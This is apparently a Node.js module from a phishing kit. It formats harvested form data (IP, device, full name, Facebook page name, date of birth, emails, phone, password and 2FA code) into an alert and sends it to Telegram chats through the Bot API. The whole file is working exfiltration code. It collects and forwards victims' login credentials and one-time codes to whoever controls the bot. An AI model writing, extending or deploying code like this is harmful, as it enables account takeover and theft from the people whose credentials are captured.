const { TELEGRAM_BOT_TOKEN, CHAT_IDS_ARRAY } = require('./config');
const { escapeHtml } = require('./utils');

function buildMessage(data, ip = 'Unknown') {
    let msg = `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨\n`;
    msg += `────────────────────────\n`;
    
    msg += `🌐 <b>Network & Source</b>\n`;
    msg += `• <b>IP:</b> <code>${escapeHtml(ip)}</code>\n`;
    msg += `• <b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
    msg += `• <b>Domain:</b> ${escapeHtml(data.source || 'Unknown')}\n`;

    if (data.device) {
        const d = data.device;
        const deviceParts = [];
        if (d.os) deviceParts.push(escapeHtml(d.os));
        if (d.browser) deviceParts.push(escapeHtml(d.browser));
        if (d.screen) deviceParts.push(escapeHtml(d.screen));
        if (d.mobile) deviceParts.push('📱 Mobile');
        msg += `• <b>Device:</b> ${deviceParts.join(' | ') || 'Unknown'}\n`;
    }

    msg += `\n👤 <b>Personal Information</b>\n`;
    if (data.fullName) msg += `• <b>Full Name:</b> <b>${escapeHtml(data.fullName)}</b>\n`;
    if (data.fanpage) msg += `• <b>Page Name:</b> ${escapeHtml(data.fanpage)}\n`;
    if (data.dob) msg += `• <b>Date of Birth:</b> ${escapeHtml(data.dob)}\n`;

    msg += `\n📞 <b>Contact Details</b>\n`;
    if (data.email) msg += `• <b>Email:</b> <code>${escapeHtml(data.email)}</code>\n`;
    if (data.emailBusiness) msg += `• <b>Email Business:</b> <code>${escapeHtml(data.emailBusiness)}</code>\n`;
    if (data.phone) msg += `• <b>Phone:</b> <code>${escapeHtml(data.phone)}</code>\n`;
    if (data.note) msg += `• <b>Note:</b> <i>${escapeHtml(data.note)}</i>\n`;

    if (data.password || data.code) {
        msg += `\n🔒 <b>Security Data</b>\n`;
        if (data.password) {
            msg += `• <b>Password:</b> <code>${escapeHtml(data.password)}</code>\n`;
        }
        if (data.code) {
            msg += `• <b>Code 2FA:</b> <code>${escapeHtml(data.code)}</code>\n`;
        }
    }

    msg += `────────────────────────`;
    return msg;
}

async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
        return false;
    }

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const resData = await response.json();
            return resData.ok;
        } catch (e) {
            return false;
        }
    });

    const results = await Promise.all(promises);
    return results.some(res => res === true);
}

module.exports = {
    buildMessage,
    sendTelegram
};